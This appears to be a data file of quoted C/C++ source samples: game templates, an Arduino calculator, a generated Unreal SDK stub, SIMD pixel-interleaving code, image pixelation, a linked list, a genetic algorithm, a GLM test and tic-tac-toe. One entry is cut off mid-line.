    "/// <summary>\n/// @author Peter Lowe\n/// @date May 2019\n///\n/// you need to change the above lines or lose marks\n/// </summary>\n\n#include \"Template.h\"\n#include <iostream>\n\n\n\n/// <summary>\n/// default constructor\n/// setup the window properties\n/// load and setup the text \n/// load and setup thne image\n/// </summary>\nGame::Game() :\n\tm_window{ sf::VideoMode{ 1000U, 1200U, 32U }, \"SFML Game\" },\n\tm_exitGame{false} //when true game will exit\n{\n\tsetupFontAndText(); // load font \n\tsetupCursor();\n}\n\n/// <summary>\n/// default destructor we didn't dynamically allocate anything\n/// so we don't need to free it, but mthod needs to be here\n/// </summary>\nGame::~Game()\n{\n}\n\n\n/// <summary>\n/// main game loop\n/// update 60 times per second,\n/// process update as often as possible and at least 60 times per second\n/// draw as often as possible but only updates are on time\n/// if updates run slow then don't render frames\n/// </summary>\nvoid Game::run()\n{\t\n\tsf::Clock clock;\n\tsf::Time timeSinceLastUpdate = sf::Time::Zero;\n\tconst float fps{ 60.0f };\n\tsf::Time timePerFrame = sf::seconds(1.0f / fps); // 60 fps\n\twhile (m_window.isOpen())\n\t{\n\t\tprocessEvents(); // as many as possible\n\t\ttimeSinceLastUpdate += clock.restart();\n\t\twhile (timeSinceLastUpdate > timePerFrame)\n\t\t{\n\t\t\ttimeSinceLastUpdate -= timePerFrame;\n\t\t\tprocessEvents(); // at least 60 fps\n\t\t\tupdate(timePerFrame); //60 fps\n\t\t}\n\t\trender(); // as many as possible\n\t}\n}\n/// <summary>\n/// handle user and system events/ input\n/// get key presses/ mouse moves etc. from OS\n/// and user :: Don't do game update here\n/// </summary>\nvoid Game::processEvents()\n{\n\tsf::Event newEvent;\n\twhile (m_window.pollEvent(newEvent))\n\t{\n\t\tif ( sf::Event::Closed == newEvent.type) // window message\n\t\t{\n\t\t\tm_exitGame = true;\n\t\t}\n\t\tif (sf::Event::KeyPressed == newEvent.type) //user pressed a key\n\t\t{\n\t\t\tprocessKeys(newEvent);\n\t\t}\n\t}\n}\n\n\n/// <summary>\n/// deal with key presses from the user\n/// </summary>\n/// <param name=\"t_event\">key press event</param>\nvoid Game::processKeys(sf::Event t_event)\n{\n\tif (sf::Keyboard::Escape == t_event.key.code)\n\t{\n\t\tm_exitGame = true;\n\t}\n}\n\n/// <summary>\n/// Update the game world\n/// </summary>\n/// <param name=\"t_deltaTime\">time interval per frame</param>\nvoid Game::update(sf::Time t_deltaTime)\n{\n\tif (m_exitGame)\n\t{\n\t\tm_window.close();\n\t}\n\n\tupdateCursor(m_cursor,m_window);\n\n}\n\n/// <summary>\n/// draw the frame and then switch buffers\n/// </summary>\nvoid Game::render()\n{\n\tm_window.clear(sf::Color::Black);\n\n\tm_window.draw(m_cursor);\n\n\tm_window.display();\n}\n\n/// <summary>\n/// load the font and setup the text message for screen\n/// </summary>\nvoid Game::setupFontAndText()\n{\n\tif (!m_ArialBlackfont.loadFromFile(\"ASSETS\\\\FONTS\\\\ariblk.ttf\"))\n\t{\n\t\tstd::cout << \"problem loading arial black font\" << std::endl;\n\t}\n\tm_welcomeMessage.setFont(m_ArialBlackfont);\n\tm_welcomeMessage.setString(\"SFML Game\");\n\tm_welcomeMessage.setStyle(sf::Text::Underlined | sf::Text::Italic | sf::Text::Bold);\n\tm_welcomeMessage.setPosition(40.0f, 40.0f);\n\tm_welcomeMessage.setCharacterSize(80U);\n\tm_welcomeMessage.setOutlineColor(sf::Color::Red);\n\tm_welcomeMessage.setFillColor(sf::Color::Black);\n\tm_welcomeMessage.setOutlineThickness(3.0f);\n\n}\n\n/// <summary>\n/// load the texture and setup the sprite for the logo\n/// </summary>\n\nvoid Game::setupCursor()\t\t//set up the cursor circle that follows the mouse \n{\n\n\tm_cursor.setFillColor(sf::Color::White);\n\tm_cursor.setRadius(5);\n\tm_cursor.setOrigin(2.5, 2.5);\n\n}\n\nvoid Game::updateCursor(sf::CircleShape& t_cursor, sf::RenderWindow& t_window)\t\t// update the cursor circles position every frame \n{\n\tsf::Vector2i mousePosition = sf::Mouse::getPosition(t_window);\n\n\tt_cursor.setPosition(static_cast<sf::Vector2f>(mousePosition));\n\n}\n",
    "#include <LiquidCrystal.h>\n\n// C++ code\n//\n\nLiquidCrystal lcd(12, 11, 5, 4, 3, 2);\n\n\n\nint qualOperacao;\nint primeiroValor;\nint segundoValor;\n\nString operacao;\nString op;\n\nint resultado;\nfloat resultadoDivisao;\n\nint pot = A0;\nint pot2 = A1;\nint pot3 = A2;\n\nvoid setup()\n{\n  Serial.begin(9600);\n  lcd.begin(16, 2);\n  lcd.setCursor(0, 0);\n  \n  pinMode(analogRead(pot), INPUT);\n  pinMode(analogRead(pot2), INPUT);\n  pinMode(analogRead(pot3), INPUT);\n}\n\nvoid loop()\n{\n  qualOperacao = map(analogRead(pot), 0, 1023, 1, 5);\n  primeiroValor = map(analogRead(pot2), 0, 1023, 1, 99);\n  segundoValor = map(analogRead(pot3), 0, 1023, 1, 99);\n  \n  if(qualOperacao == 1) {\n    lcd.clear();\n    lcd.print(\"ESCOLHA OPERACAO\");\n  \tdelay(1000);\n  }else{\n    switch (qualOperacao) {\n      case 2:\n          operacao = \"Soma\";\n          op = \" + \";\n          resultado = primeiroValor + segundoValor;\n          break;\n      case 3:\n          operacao = \"Subtracao\";\n          op = \" - \";\n          resultado = primeiroValor - segundoValor;\n          break;\n      case 4:\n          operacao = \"Multiplicacao\";\n          op = \" * \";\n          resultado = primeiroValor * segundoValor;\n          break;\n      case 5:\n          operacao = \"Divisao\";\n          op = \" / \";\n          resultadoDivisao = float(primeiroValor) / segundoValor;\n          break;\n      default:\n          break;\n    }\n    \n    if (qualOperacao == 5){\n      lcd.clear();\n      lcd.print(operacao);\n      lcd.setCursor(0, 1);\n      lcd.print(primeiroValor);\n      lcd.print(op);\n      lcd.print(segundoValor);\n      lcd.print(\" = \");\n      lcd.print(resultadoDivisao);\n      delay(1000);\n    } else {\n      lcd.clear();\n      lcd.print(operacao);\n      lcd.setCursor(0, 1);\n      lcd.print(primeiroValor);\n      lcd.print(op);\n      lcd.print(segundoValor);\n      lcd.print(\" = \");\n      lcd.print(resultado);\n      delay(1000);\n    \n    }\n    \n    \n  }\n   \n  \n}\n",
    "#pragma once\n\n/*\n* SDK generated by Dumper-7\n*\n* https://github.com/Encryqed/Dumper-7\n*/\n\n// Package: E_Pickup_Health\n\n#include \"Basic.hpp\"\n\n#include \"E_Pickup_Health_classes.hpp\"\n#include \"E_Pickup_Health_parameters.hpp\"\n\n\nnamespace SDK\n{\n\n// Function E_Pickup_Health.E_Pickup_Health_C.ExecuteUbergraph_E_Pickup_Health\n// (Final, UbergraphFunction)\n// Parameters:\n// int32                                   EntryPoint                                             (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid AE_Pickup_Health_C::ExecuteUbergraph_E_Pickup_Health(int32 EntryPoint)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"E_Pickup_Health_C\", \"ExecuteUbergraph_E_Pickup_Health\");\n\n\tParams::E_Pickup_Health_C_ExecuteUbergraph_E_Pickup_Health Parms{};\n\n\tParms.EntryPoint = EntryPoint;\n\n\tUObject::ProcessEvent(Func, &Parms);\n}\n\n\n// Function E_Pickup_Health.E_Pickup_Health_C.HandleReset\n// (Event, Public, BlueprintCallable, BlueprintEvent)\n\nvoid AE_Pickup_Health_C::HandleReset()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"E_Pickup_Health_C\", \"HandleReset\");\n\n\tUObject::ProcessEvent(Func, nullptr);\n}\n\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"rx_track\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <VapourSynth4.h>\n#include <VSHelper4.h>\n#include <cstring>\n#include <string>\n\n#include \"fpnge/fpnge.h\"\n#include <turbojpeg.h>\n\n// requires SSE4.1 minimum\n// TODO: add AVX2 support\n#include <smmintrin.h>\n#define MWORD_SIZE 16  // sizeof(__m128i)\n\n\n/// planar -> interleaved conversion\n\nstatic inline void copy1x16b(uint8_t* VS_RESTRICT dst, const uint8_t* VS_RESTRICT src0, int width, int bits, bool endianSwap) {\n\tuint16_t* d16 = reinterpret_cast<uint16_t*>(dst);\n\tconst uint16_t* s0_16 = reinterpret_cast<const uint16_t*>(src0);\n\tint shl = endianSwap ? (24-bits) : (16-bits);\n\tint shr = endianSwap ? (bits-8) : (bits*2 - 16);\n\t__m128i vshl = _mm_set_epi32(0, shr, 0, shl);\n\t__m128i vshr = _mm_unpackhi_epi64(vshl, vshl);\n\t\n\tint x = 0;\n\tfor(; x<width-MWORD_SIZE/2+1; x+=MWORD_SIZE/2) {\n\t\t__m128i s0 = _mm_loadu_si128(reinterpret_cast<const __m128i*>(s0_16 + x));\n\t\ts0 = _mm_or_si128(_mm_sll_epi16(s0, vshl), _mm_srl_epi16(s0, vshr));\n\t\t_mm_store_si128(reinterpret_cast<__m128i*>(d16 + x), s0);\n\t}\n\tfor(; x<width; x++) {\n\t\td16[x] = (s0_16[x] << shl) | (s0_16[x] >> shr);\n\t}\n}\n\nstatic inline void interleave2x8b(uint8_t* VS_RESTRICT dst, const uint8_t* VS_RESTRICT src0, const uint8_t* VS_RESTRICT src1, int width) {\n\tint x = 0;\n\tfor(; x<width-MWORD_SIZE+1; x+=MWORD_SIZE) {\n\t\t__m128i s0 = _mm_loadu_si128(reinterpret_cast<const __m128i*>(src0 + x));\n\t\t__m128i s1 = _mm_loadu_si128(reinterpret_cast<const __m128i*>(src1 + x));\n\t\t\n\t\t__m128i* d = reinterpret_cast<__m128i*>(dst + x*2);\n\t\t_mm_store_si128(d+0, _mm_unpacklo_epi8(s0, s1));\n\t\t_mm_store_si128(d+1, _mm_unpackhi_epi8(s0, s1));\n\t}\n\tfor(; x<width; x++) {\n\t\tdst[x*2 +0] = src0[x];\n\t\tdst[x*2 +1] = src1[x];\n\t}\n}\nstatic inline void interleave2x16b(uint8_t* VS_RESTRICT dst, const uint8_t* VS_RESTRICT src0, const uint8_t* VS_RESTRICT src1, int width, int bits, bool endianSwap) {\n\tuint16_t* d16 = reinterpret_cast<uint16_t*>(dst);\n\tconst uint16_t* s0_16 = reinterpret_cast<const uint16_t*>(src0);\n\tconst uint16_t* s1_16 = reinterpret_cast<const uint16_t*>(src1);\n\tint shl = endianSwap ? (24-bits) : (16-bits);\n\tint shr = endianSwap ? (bits-8) : (bits*2 - 16);\n\t__m128i vshl = _mm_set_epi32(0, shr, 0, shl);\n\t__m128i vshr = _mm_unpackhi_epi64(vshl, vshl);\n\t\n\tint x = 0;\n\tfor(; x<width-MWORD_SIZE/2+1; x+=MWORD_SIZE/2) {\n\t\t__m128i s0 = _mm_loadu_si128(reinterpret_cast<const __m128i*>(s0_16 + x));\n\t\t__m128i s1 = _mm_loadu_si128(reinterpret_cast<const __m128i*>(s1_16 + x));\n\t\t\n\t\ts0 = _mm_or_si128(_mm_sll_epi16(s0, vshl), _mm_srl_epi16(s0, vshr));\n\t\ts1 = _mm_or_si128(_mm_sll_epi16(s1, vshl), _mm_srl_epi16(s1, vshr));\n\t\t\n\t\t__m128i* d = reinterpret_cast<__m128i*>(d16 + x*2);\n\t\t_mm_store_si128(d+0, _mm_unpacklo_epi16(s0, s1));\n\t\t_mm_store_si128(d+1, _mm_unpackhi_epi16(s0, s1));\n\t}\n\tfor(; x<width; x++) {\n\t\td16[x*2 +0] = (s0_16[x] << shl) | (s0_16[x] >> shr);\n\t\td16[x*2 +1] = (s1_16[x] << shl) | (s1_16[x] >> shr);\n\t}\n}\nstatic inline void interleave3x8b(uint8_t* VS_RESTRICT dst, const uint8_t* VS_RESTRICT src0, const uint8_t* VS_RESTRICT src1, const uint8_t* VS_RESTRICT src2, int width) {\n\tint x = 0;\n\t__m128i blend1 = _mm_set_epi32(0x0000ff00, 0x00ff0000, 0xff0000ff, 0x0000ff00);\n\t__m128i blend2 = _mm_bslli_si128(blend1, 1);\n\t__m128i shuf0 = _mm_set_epi32(0x050a0f04, 0x090e0308, 0x0d02070c, 0x01060b00);\n\t__m128i shuf1 = _mm_alignr_epi8(shuf0, shuf0, 15);\n\t__m128i shuf2 = _mm_alignr_epi8(shuf0, shuf0, 14);\n\tfor(; x<width-MWORD_SIZE+1; x+=MWORD_SIZE) {\n\t\t__m128i s0 = _mm_loadu_si128(reinterpret_cast<const __m128i*>(src0 + x));\n\t\t__m128i s1 = _mm_loadu_si128(reinterpret_cast<const __m128i*>(src1 + x));\n\t\t__m128i s2 = _mm_loadu_si128(reinterpret_cast<const __m128i*>(src2 + x));\n\t\t\n\t\t// re-arrange into groups of 3\n\t\ts0 = _mm_shuffle_epi8(s0, shuf0);\n\t\ts1 = _mm_shuffle_epi8(s1, shuf1);\n\t\ts2 = _mm_shuffle_epi8(s2, shuf2);\n\t\t\n\t\t// blend together\n\t\t__m128i d0 = _mm_blendv_epi8(s0, s1, blend1);\n\t\t__m128i d1 = _mm_blendv_epi8(s1, s2, blend1);\n\t\t__m128i d2 = _mm_blendv_epi8(s2, s0, blend1);\n\t\td0 = _mm_blendv_epi8(d0, s2, blend2);\n\t\td1 = _mm_blendv_epi8(d1, s0, blend2);\n\t\td2 = _mm_blendv_epi8(d2, s1, blend2);\n\t\t\n\t\t__m128i* d = reinterpret_cast<__m128i*>(dst + x*3);\n\t\t_mm_store_si128(d+0, d0);\n\t\t_mm_store_si128(d+1, d1);\n\t\t_mm_store_si128(d+2, d2);\n\t}\n\tfor(; x<width; x++) {\n\t\tdst[x*3 +0] = src0[x];\n\t\tdst[x*3 +1] = src1[x];\n\t\tdst[x*3 +2] = src2[x];\n\t}\n}\nstatic inline void interleave3x16b(uint8_t* VS_RESTRICT dst, const uint8_t* VS_RESTRICT src0, const uint8_t* VS_RESTRICT src1, const uint8_t* VS_RESTRICT src2, int width, int bits, bool endianSwap) {\n\tuint16_t* d16 = reinterpret_cast<uint16_t*>(dst);\n\tconst uint16_t* s0_16 = reinterpret_cast<const uint16_t*>(src0);\n\tconst uint16_t* s1_16 = reinterpret_cast<const uint16_t*>(src1);\n\tconst uint16_t* s2_16 = reinterpret_cast<const uint16_t*>(src2);\n\tint shl = endianSwap ? (24-bits) : (16-bits);\n\tint shr = endianSwap ? (bits-8) : (bits*2 - 16);\n\t__m128i vshl = _mm_set_epi32(0, shr, 0, shl);\n\t__m128i vshr = _mm_unpackhi_epi64(vshl, vshl);\n\t\n\t__m128i shuf0 = _mm_set_epi3",
    "/*Author: Stan Yin\r\n* GitHub Name: SomeB1oody\r\n* This project is based on CC 4.0 BY, please mention my name if you use it.\r\n* This project requires opencv.\r\n*/\r\n#include<bits/stdc++.h>\r\n#include<opencv2/opencv.hpp>\r\nusing namespace std;\r\nusing namespace cv;\r\nint main()\r\n{\r\n    cout << \"Please enter image location\" << endl;\r\n    cout <<\"Example: C:\\\\Wallpaper\\\\02.png\" << endl;\r\n    cout << \"Enter HERE: \";\r\n    string path;\r\n    cin >> path;\r\n    Mat img = imread(path, IMREAD_COLOR);\r\n    cout << \"Please enter the size of a single pixel sector:\" << endl;\r\n    int sector_size;\r\n    cin >> sector_size;\r\n    if(img.empty()){\r\n        cerr << \"Error opening file\" << endl;\r\n        return -1;\r\n    }\r\n    if(sector_size < 1){\r\n        cerr << \"Sector size invalid. Size is too small\";\r\n    }\r\n    if(sector_size > img.cols || sector_size > img.rows){\r\n        cerr << \"Sector size invalid. Size is too large\";\r\n    }\r\n    int row_number = img.rows;\r\n    int col_number = img.cols;\r\n    bool flag1 = true;\r\n    bool flag2 = true;\r\n    while(flag1 && flag2){\r\n        if(row_number % sector_size != 0){\r\n            row_number -= 1;\r\n        }\r\n        else{\r\n            flag1 = false;\r\n        }\r\n        if(col_number % sector_size != 0){\r\n            col_number -= 1;\r\n        }\r\n        else{\r\n            flag2 = false;\r\n        }\r\n    }\r\n    int row_new = row_number / sector_size;\r\n    int col_new = col_number / sector_size;\r\n    Mat img_new = Mat::zeros(row_new, col_new, img.type());\r\n    int symbol_row = 0, symbol_col = 0;\r\n    for(int row = 0; row < row_new; row++){\r\n        for(int col = 0; col < col_new; col++) {\r\n            symbol_row = row * sector_size;\r\n            symbol_col = col * sector_size;\r\n            Rect sector_rect(symbol_row, symbol_col, sector_size, sector_size);\r\n            Mat sector = img(sector_rect);\r\n            Scalar mean_color = mean(sector);\r\n            Vec3b average_color;\r\n            average_color[0] = static_cast<uchar>(mean_color[0]);\r\n            average_color[1] = static_cast<uchar>(mean_color[1]);\r\n            average_color[2] = static_cast<uchar>(mean_color[2]);\r\n            img_new.at<Vec3b>(row, col) = average_color;\r\n        }\r\n    }\r\n    namedWindow(\"Reduced Image\");\r\n    imshow(\"Reduced Image\", img_new);\r\n    waitKey(0);\r\n    imwrite(\"Reduced_Image.jpg\", img_new);\r\n    return 0;\r\n}\r\n",
    "#include<iostream>\r\nusing namespace std ;\r\n\r\nclass Node {\r\n\r\n    public :\r\n    int val ; \r\n    Node* next ; \r\n\r\n    Node(int val) {\r\n        this->next = NULL ; \r\n        this->val = val ; \r\n    }\r\n};\r\n\r\nclass Linkedlist {\r\n    public : \r\n    Node * head ; \r\n    Node * tail ; \r\n    int size ; \r\n    Linkedlist() {\r\n        head = tail = NULL ; \r\n        size = 0 ; \r\n    }\r\n    void insertAtend(int val) {\r\n        Node* temp = new Node(val) ; \r\n\r\n        if(size == 0) {\r\n            head = tail = temp ;\r\n        }\r\n        else {\r\n            tail->next = temp ; \r\n            tail = temp ; \r\n        }\r\n        size++ ; \r\n    }\r\nvoid InsertAtbegin(int val){\r\n    Node *temp = new Node(val);\r\n    if(size == 0){\r\n        head = tail = temp; // Head and tail both should point to the new node.\r\n    }\r\n    else {\r\n        temp->next = head; // Point the new node to the current head.\r\n        head = temp; // Update the head to the new node.\r\n    }\r\n    size++; \r\n}\r\n\r\n    void InsertAtidx(int idx , int val) {\r\n        if(idx == 0) InsertAtbegin(val) ; \r\n        else if(idx == size) insertAtend(val) ; \r\n        else if (idx < 0 || idx > size) cout << \"Enter valid index\" << \"\\n\"   ; \r\n        else {\r\n            Node* temp = head ; \r\n            int mn = 0 ; \r\n            while (idx > mn) {\r\n                if(idx-1 == mn) {\r\n                    Node* t = new Node(val) ; \r\n                    t->next = temp->next ; \r\n                    temp->next = t ; \r\n                    break;\r\n                }\r\n                else {\r\n                    temp = temp->next ; \r\n                    mn++ ; \r\n                }\r\n            } \r\n            size++ ; \r\n        }\r\n    }\r\n\r\n    void deletAThead() {\r\n        if(size == 0) {\r\n            cout << \"LL is empty \" ; \r\n            return ;\r\n        }\r\n        else {\r\n            head = head->next ; \r\n            size-- ; \r\n        }\r\n\r\n    }\r\n    void display() {\r\n        if(size == 0)   cout << \"Nothing to print ??? \\n\" ; \r\n        Node * ans = head ; \r\n        while(ans != NULL) {\r\n            cout << ans->val << \" -->  \"; \r\n            ans = ans->next ; \r\n        }\r\n        cout << endl ; \r\n    }\r\n};\r\n\r\nint main() {\r\n    Linkedlist n; \r\n    bool flag = true; \r\n    do {\r\n        cout << \"1. Display \\n\"; \r\n        cout << \"2. Delete head \\n\"; \r\n        cout << \"3. Insert at head \\n\"; \r\n        cout << \"4. Insert at index \\n\"; \r\n        cout << \"5. Insert at end \\n\";\r\n        cout << \"6. Exit \\n\"; \r\n        int x = 0; \r\n        cin >> x; \r\n        if(x == 1) {\r\n            n.display(); \r\n        }\r\n        else if(x == 2) {\r\n            n.deletAThead(); \r\n        }\r\n        else if(x == 3) {\r\n            cout << \"Enter what to insert: \"; \r\n            int val; \r\n            cin >> val; \r\n            n.InsertAtbegin(val); \r\n        }\r\n        else if(x == 4) {\r\n            cout << \"Enter index and value: \"; \r\n            int idx, val; \r\n            cin >> idx >> val; \r\n            n.InsertAtidx(idx, val); \r\n        }\r\n        else if(x == 5) {\r\n            cout << \"Enter value to insert at end: \"; \r\n            int val; \r\n            cin >> val; \r\n            n.insertAtend(val); \r\n        }\r\n        else if(x == 6) {\r\n            flag = false; \r\n        }\r\n    } while(flag); \r\n}\r\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <algorithm>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#define K 2\r\n#include \"genethic.h\"\r\nusing namespace std;\r\n\r\n\r\nint main()\r\n{\r\n    int populationSize = 10;\r\n    int numCities = 6;\r\n\tint gen = 3;\r\n\tint startGen = 1;\r\n    \r\n    vector<vector<unsigned int>> costMatrix = mat(numCities);\r\n    vector<string> cityNames = nameGenerator(numCities);\r\n    vector<vertex> graph = graphGenerator(costMatrix, cityNames);\r\n    vector<vector<string>>popString = popPathMatrix(populationSize, numCities, cityNames);\r\n    vector<int>popCost = costInd(populationSize, numCities, popString, graph, costMatrix);\r\n    vector<Population> generatedPopulation = populationArray(graph, numCities, populationSize, popString, popCost);\r\n    for (const auto &v : graph)\r\n    {\r\n        cout << \"Vertex \" << v.name << \": \";\r\n        for (const auto cost : v.cost)\r\n        {\r\n            cout << cost << \" \";\r\n        }\r\n        cout << endl;\r\n    }\r\n    while(gen != 0)\r\n    {\r\n\tcout << \"GEN :\" << startGen << endl;\r\n\r\n\tfor (const auto individual : generatedPopulation)\r\n\t{\r\n\t    cout << \"PathName: \" << individual.pathName << \" | \";\r\n\t    for (const string &city : individual.path)\r\n\t    {\r\n\t        cout << city << \" \";\r\n\t    }\r\n\t    cout << \"| Cost: \" << individual.cost; \r\n\t    cout << endl;\r\n\t}\r\n\tvector<Population> matingPool = selectionOperator(generatedPopulation, populationSize);\r\n\tcout << \"MATING POOL BY SELECTION OPERATOR : \" << endl;\r\n\tfor (const auto pool : matingPool)\r\n\t{\r\n\t    cout << \"PathName: \" << pool.pathName << \" | \";\r\n\t    for (const string path : pool.path)\r\n\t    {\r\n\t        cout << path << \" \";\r\n\t    }\r\n\t    cout << \" Cost \" << pool.cost << \" |  \" << endl;\r\n\t}\r\n    vector<vector<string>> offString = crossOver(matingPool, populationSize, numCities);\r\n    vector<int>offCost = costInd(offString.size(), numCities, offString, graph, costMatrix);\r\n    vector<Population> springOff = offSpring(offString, graph, numCities, populationSize, costMatrix, offCost);\r\n    cout << \"OFFSPRING DETAILS:\" << endl;\r\n    for (const auto individual : springOff)\r\n    {\r\n        cout << \"PathName: \" << individual.pathName << \" | \";\r\n        for (const string city : individual.path)\r\n        {\r\n            cout << city << \" \";\r\n        }\r\n        cout << \"| Cost: \" << individual.cost;\r\n        cout << endl;\r\n    }\r\n    cout << \" ELITIST INDIVIDUALS OF\" << \" GEN : \" << startGen << endl;\r\n    elitistInd(generatedPopulation, springOff);\r\n    gen--;\r\n    startGen++;\r\n}\r\n    return 0;\r\n}\r\n",
    "#include <glm/gtx/color_encoding.hpp>\n#include <glm/gtc/color_space.hpp>\n#include <glm/gtc/epsilon.hpp>\n#include <glm/gtc/constants.hpp>\n\nnamespace srgb\n{\n\tint test()\n\t{\n\t\tint Error(0);\n\n\t\tglm::vec3 const ColorSourceRGB(1.0, 0.5, 0.0);\n/*\n\t\t{\n\t\t\tglm::vec3 const ColorSRGB = glm::convertLinearSRGBToD65XYZ(ColorSourceRGB);\n\t\t\tglm::vec3 const ColorRGB = glm::convertD65XYZToLinearSRGB(ColorSRGB);\n\t\t\tError += glm::all(glm::epsilonEqual(ColorSourceRGB, ColorRGB, 0.00001f)) ? 0 : 1;\n\t\t}\n*/\n\t\t{\n\t\t\tglm::vec3 const ColorSRGB = glm::convertLinearToSRGB(ColorSourceRGB, 2.8f);\n\t\t\tglm::vec3 const ColorRGB = glm::convertSRGBToLinear(ColorSRGB, 2.8f);\n\t\t\tError += glm::all(glm::epsilonEqual(ColorSourceRGB, ColorRGB, 0.00001f)) ? 0 : 1;\n\t\t}\n\n\t\tglm::vec4 const ColorSourceRGBA(1.0, 0.5, 0.0, 1.0);\n\n\t\t{\n\t\t\tglm::vec4 const ColorSRGB = glm::convertLinearToSRGB(ColorSourceRGBA);\n\t\t\tglm::vec4 const ColorRGB = glm::convertSRGBToLinear(ColorSRGB);\n\t\t\tError += glm::all(glm::epsilonEqual(ColorSourceRGBA, ColorRGB, 0.00001f)) ? 0 : 1;\n\t\t}\n\n\t\t{\n\t\t\tglm::vec4 const ColorSRGB = glm::convertLinearToSRGB(ColorSourceRGBA, 2.8f);\n\t\t\tglm::vec4 const ColorRGB = glm::convertSRGBToLinear(ColorSRGB, 2.8f);\n\t\t\tError += glm::all(glm::epsilonEqual(ColorSourceRGBA, ColorRGB, 0.00001f)) ? 0 : 1;\n\t\t}\n\n\t\treturn Error;\n\t}\n}//namespace srgb\n\nint main()\n{\n\tint Error(0);\n\n\tError += srgb::test();\n\n\treturn Error;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nchar board[3][3] = {{'1', '2', '3'}, {'4', '5', '6'}, {'7', '8', '9'}};\r\nchar turn = 'X';\r\nbool draw = false;\r\n\r\nvoid display_board() {\r\n    system(\"cls\"); // Use system(\"clear\") for Unix-based systems\r\n    cout << \"\\n\\n  Welcome to Tic Tac Toe Game\" << endl;\r\n    cout << \"\\tPlayer1 [X] \\n\\tPlayer2 [O]\\n\\n\";\r\n    cout << \"\\t\\t      |     |     \\n\";\r\n    cout << \"\\t\\t   \" << board[0][0] << \"  |  \" << board[0][1] << \"  |  \" << board[0][2] << \"  \\n\";\r\n    cout << \"\\t\\t _____|_____|_____\\n\";\r\n    cout << \"\\t\\t      |     |     \\n\";\r\n    cout << \"\\t\\t   \" << board[1][0] << \"  |  \" << board[1][1] << \"  |  \" << board[1][2] << \"  \\n\";\r\n    cout << \"\\t\\t______|_____|_____\\n\";\r\n    cout << \"\\t\\t      |     |     \\n\";\r\n    cout << \"\\t\\t   \" << board[2][0] << \"  |  \" << board[2][1] << \"  |  \" << board[2][2] << \"  \\n\";\r\n    cout << \"\\t\\t      |     |     \\n\";\r\n}\r\n\r\nvoid player_turn() {\r\n    int choice;\r\n    if (turn == 'X')\r\n        cout << \"\\nPlayer1 [X] turn:\";\r\n    else\r\n        cout << \"\\nPlayer2 [O] turn:\";\r\n    cin >> choice;\r\n\r\n    int row = -1, column = -1;\r\n    switch (choice) {\r\n        case 1: row = 0; column = 0; break;\r\n        case 2: row = 0; column = 1; break;\r\n        case 3: row = 0; column = 2; break;\r\n        case 4: row = 1; column = 0; break;\r\n        case 5: row = 1; column = 1; break;\r\n        case 6: row = 1; column = 2; break;\r\n        case 7: row = 2; column = 0; break;\r\n        case 8: row = 2; column = 1; break;\r\n        case 9: row = 2; column = 2; break;\r\n        default:\r\n            cout << \"Invalid choice! Try again.\\n\";\r\n            player_turn();\r\n            return;\r\n    }\r\n\r\n    if (row != -1 && column != -1 && board[row][column] != 'X' && board[row][column] != 'O') {\r\n        board[row][column] = turn;\r\n        turn = (turn == 'X') ? 'O' : 'X';\r\n    } else {\r\n        cout << \"Box is already filled! Try again.\\n\";\r\n        player_turn();\r\n    }\r\n}\r\n\r\nbool gameover() {\r\n    // Check for win condition\r\n    for (int i = 0; i < 3; i++) {\r\n        // Check rows and columns\r\n        if ((board[i][0] == board[i][1] && board[i][1] == board[i][2]) ||\r\n            (board[0][i] == board[1][i] && board[1][i] == board[2][i])) {\r\n            return false;\r\n        }\r\n    }\r\n    // Check diagonals\r\n    if ((board[0][0] == board[1][1] && board[1][1] == board[2][2]) ||\r\n        (board[0][2] == board[1][1] && board[1][1] == board[2][0])) {\r\n        return false;\r\n    }\r\n    // Check for draw\r\n    for (int i = 0; i < 3; i++) {\r\n        for (int j = 0; j < 3; j++) {\r\n            if (board[i][j] != 'X' && board[i][j] != 'O')\r\n                return true; // Game still ongoing\r\n        }\r\n    }\r\n    draw = true;\r\n    return false;\r\n}\r\n\r\nint main() {\r\n    while (gameover()) {\r\n        display_board();\r\n        player_turn();\r\n    }\r\n    display_board();\r\n    if (turn == 'X' && !draw)\r\n        cout << \"Player 2 [O] wins! Congratulations!\\n\";\r\n    else if (turn == 'O' && !draw)\r\n        cout << \"Player 1 [X] wins! Congratulations!\\n\";\r\n    else\r\n        cout << \"Game draw!\\n\";\r\n\r\n    return 0;\r\n}\r\n",
